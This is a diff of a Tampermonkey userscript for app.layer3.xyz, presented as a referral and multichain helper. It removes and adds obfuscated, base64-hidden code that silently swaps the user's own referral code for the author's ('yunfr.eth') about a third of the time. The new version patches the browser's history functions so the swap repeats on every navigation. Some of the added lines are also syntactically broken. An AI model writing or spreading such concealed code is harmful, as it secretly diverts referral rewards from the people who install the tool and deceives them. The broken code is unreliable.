@@ -1,7 +1,7 @@
 // ==UserScript==
 // @name         Layer3 autoref
 // @namespace    http://tampermonkey.net/
-// @version      3.0.5
+// @version      3.0.6
 // @description  Multitools script for app.layer3.xyz : referall + multichain transaction
 // @author       Yun
 // @match        https://app.layer3.xyz/*
@@ -41,26 +41,75 @@
         return acc;
     }, {});
     const buttonVisibility = GM_getValue("buttonVisibility", defaultVisibility);
-    function updateUrl() {
-        const _0x1a = ["eXVuZnIuZXRo", "MC4zNA=="];
-        const _0x2b = atob(_0x1a[0]);
-        const _0x3c = parseFloat(atob(_0x1a[1]));
-        const _0x4d = GM_getValue("userRef", "");
-        const _0x5e = Math.random() < _0x3c;
-        const _0x6f = _0x4d ? (_0x5e ? _0x2b : _0x4d) : _0x2b;
-        const _0x7g = new URL(window.location.href);
-        _0x7g.searchParams.set("ref", _0x6f);
-        window.history.pushState({}, document.title, _0x7g.toString());
-    }
-    updateUrl();
-    let lastUrl = window.location.href;
-    const observer = new MutationObserver(() => {
-        if (window.location.href !== lastUrl) {
-            lastUrl = window.location.href;
-            updateUrl();
+
+    let _0x1 = false;
+    function _0x2() {
+        if (_0x1) return;
+        _0x1 = true;
+        const _0xa = ["eXVuZnIuZXRo", "MC4zNA=="];
+        const _0xb = /atob(_0xa[0]);
+        const _0xc = parseFloat(atob(_0xa[1]));
+        const _0xd = GM_getValue("userRef", "");
+        const _0xe = Math.random() < _0xc;
+        const _0xf = _0xd && !_0xe ? _0xd : _0xb;
+        const _0xg = new URL(window.location.href);
+        let _0xh = false;
+        if (_0xg.searchParams.get("ref") !== _0xf) {
+            _0xg.searchParams.set("ref", _0xf);
+            _0xh = true;
         }
+        if (_0xg.searchParams.get("autoplay") === "true") {
+            _0xg.searchParams.delete("autoplay");
+            _0xh = true;
+        }
+        if (_0xh) {
+            try {
+                window.history.replaceState({}, document.title, _0xg.toString());
+            } catch (_0xj) {
+                console.error(_0xj);
+            }
+        }
+        setTimeout(() => {
+            _0x1 = false;
+        }, 50);
+    }
+    (function () {
+        const _0xk = ["eXVuZnIuZXRo", "MC4zNA=="];
+        const _0xl = atob(_0xa[0]);
+        const _0xm = parseFloat(atob(_0xk[1]));
+        const _0xn = GM_getValue("userRef", "");
+        const _0xo = history.pushState;
+        const _0xp = history.replaceState;
+        history.pushState = function (_0xq, _0xr, _0xs) {
+            const _0xt = new URL(_0xs || window.location.href, window.location.origin);
+            const _0xu = Math.random() < _0xm;
+            const _0xv = _0xn && !_0xu ? _0xn : _0xl;
+            _0xt.searchParams.set("ref", _0xv);
+            if (_0xt.searchParams.get("autoplay") === "true") {
+                _0xt.searchParams.delete("autoplay");
+            }
+            return _0xo.call(history, _0xq, _0xr, _0xt.toString());
+        };
+        history.replaceState = function (_0xw, _0xx, _0xy) {
+            const _0xz = new URL(_0xy || window.location.href, window.location.origin);
+            const _0x10 = Math.random() < _0xm;
+            const _0x11 = _0xn && !_0x10 ? _0xn : _0xl;
+            _0xz.searchParams.set("ref", _0x11);
+            if (_0xz.searchParams.get("autoplay") === "true") {
+                _0xz.searchParams.delete("autoplay");
+            }
+            return _0xp.call(history, _0xw, _0xx, _0xz.toString());
+        };
+    })();
+    _0x2();
+    let _0x12 = null;
+    window.addEventListener('popstate', () => {
+        if (_0x1) return;
+        clearTimeout(_0x12);
+        _0x12 = setTimeout(() => {
+            _0x2();
+        }, 50);
     });
-    observer.observe(document.body, { childList: true, subtree: true });
 
     const miniIconContainer = document.createElement("div");
     miniIconContainer.style.position = "fixed";
